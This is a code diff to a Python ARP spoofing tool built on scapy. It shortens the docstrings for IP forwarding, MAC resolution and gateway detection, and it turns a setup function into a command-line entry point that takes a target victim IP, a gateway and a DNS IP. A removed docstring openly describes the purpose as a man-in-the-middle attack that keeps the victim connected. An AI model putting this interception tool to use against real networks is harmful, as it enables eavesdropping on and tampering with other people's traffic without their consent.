@@ -8,10 +8,7 @@ import socket
 import struct
 
 def enable_ip_forwarding():
-    """
-    Enables IP forwarding on the local machine to allow packets to flow through.
-    This is essential for a Man-in-the-Middle attack so the victim doesn't lose connectivity.
-    """
+    """Enable IP forwarding to maintain victim connectivity."""
     try:
         with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
             if f.read().strip() == "1":
@@ -26,9 +23,7 @@ def enable_ip_forwarding():
         print(f"[!] WARNING: Could not enable IP forwarding: {e}")
 
 def get_mac(ip):
-    """
-    Resolves the MAC address for a given IP address using an ARP request.
-    """
+    """Resolve MAC address for given IP using ARP."""
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
@@ -41,10 +36,7 @@ def get_mac(ip):
     return None
 
 def get_default_gateway():
-    """
-    Attempts to detect the default gateway of the system.
-    Tries Scapy first, then falls back to reading /proc/net/route.
-    """
+    """Detect default gateway IP address."""
     print("Attempting to detect default gateway...")
     
     # method 1: Scapy
@@ -180,7 +172,7 @@ def cleanup_and_exit(signum, frame):
 signal.signal(signal.SIGINT, cleanup_and_exit)
 signal.signal(signal.SIGTERM, cleanup_and_exit)
 
-def setupArpSpoof(target, gateway, dns_ip=None):
+if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
     parser.add_argument("target", help="The IP address of the target victim")
     parser.add_argument("gateway", nargs="?", help="The IP address of the gateway (optional, auto-detected if omitted)")
@@ -188,9 +180,9 @@ def setupArpSpoof(target, gateway, dns_ip=None):
     
     args = parser.parse_args()
     
-    target_ip = target
-    gateway_ip = gateway
-    dns_ip = dns_ip
+    target_ip = args.target
+    gateway_ip = args.gateway
+    dns_ip = args.dns
     
     if not gateway_ip:
         print("Gateway IP not provided. Attempting to auto-detect...")
